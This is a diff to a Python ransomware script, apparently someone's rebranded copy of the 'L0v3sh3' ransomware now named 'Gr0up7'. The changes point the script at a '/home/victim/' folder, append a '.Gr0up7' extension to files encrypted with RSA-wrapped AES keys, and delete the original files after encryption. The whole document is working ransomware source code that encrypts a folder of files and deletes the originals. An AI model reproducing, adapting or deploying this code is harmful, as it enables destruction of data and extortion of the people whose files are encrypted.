@@ -17,9 +17,9 @@ import subprocess
 #################################################     INITIALIZATIONS     #################################################
 ###########################################################################################################################
 
-ENCRYPT_FOLDER_PATH = '/home/aleix/Desktop/TestFolder/'  # CHANGE THIS
+ENCRYPT_FOLDER_PATH = '/home/victim/Desktop/TestFolder/'  # CHANGE THIS
 EXCLUDED_EXTENSIONS = ['.py', '.pem', '.exe']  # CHANGE THIS
-RANWOMWARE_WINDOW_NAME = 'L0v3sh3 Ransomware'  # CHANGE THIS
+RANWOMWARE_WINDOW_NAME = 'Gr0up7 Ransomware'  # CHANGE THIS
 
 ###########################################################################################################################
 
@@ -116,12 +116,12 @@ def decrypt(dataFile, privateKeyFile):
     data = cipher.decrypt_and_verify(ciphertext, tag)
 
     # save the decrypted data to file
-    [ fileName, fileExtension ] = dataFile.split('.')
-    decryptedFile = fileName + '_decrypted.' + fileExtension
+    decryptedFile = dataFile.replace('.Gr0up7', '')
     with open(decryptedFile, 'wb') as f:
         f.write(data)
 
-    print('Decrypted file saved to ' + decryptedFile) 
+    print('Decrypted file saved to ' + decryptedFile)
+    os.remove(dataFile)
     
 def encrypt(dataFile, publicKey):
     '''
@@ -131,6 +131,7 @@ def encrypt(dataFile, publicKey):
     '''
     # read data from file
     extension = dataFile.suffix.lower()
+    print(extension)
     dataFile = str(dataFile)
     with open(dataFile, 'rb') as f:
         data = f.read()
@@ -151,9 +152,7 @@ def encrypt(dataFile, publicKey):
     ciphertext, tag = cipher.encrypt_and_digest(data)
 
     # save the encrypted data to file
-    fileName = dataFile.split(extension)[0]
-    fileExtension = '.L0v3sh3'
-    encryptedFile = fileName + fileExtension
+    encryptedFile = dataFile + '.Gr0up7'
     with open(encryptedFile, 'wb') as f:
         [f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext)]
     os.remove(dataFile)
@@ -214,7 +213,7 @@ def encrypt_ransomware():
     return
 
 # Deploys the ransomware
-def decrypt_ransomware(key = None):
+def decrypt_ransomware():
     decryption_traversal()
 
     return
@@ -230,10 +229,10 @@ def run():
     success = True
     return success
 
-if __name__ == "__main__":
-    from time import sleep
-    encrypt_ransomware()
-
+#if __name__ == "__main__":
+    #from time import sleep
+    #encrypt_ransomware()
+    #decrypt_ransomware()
     # Uncomment to check if Tkinter can run on a different thread without freezing
     # for i in range(1000000): print(i)
-    sleep(10)
+    #sleep(2)
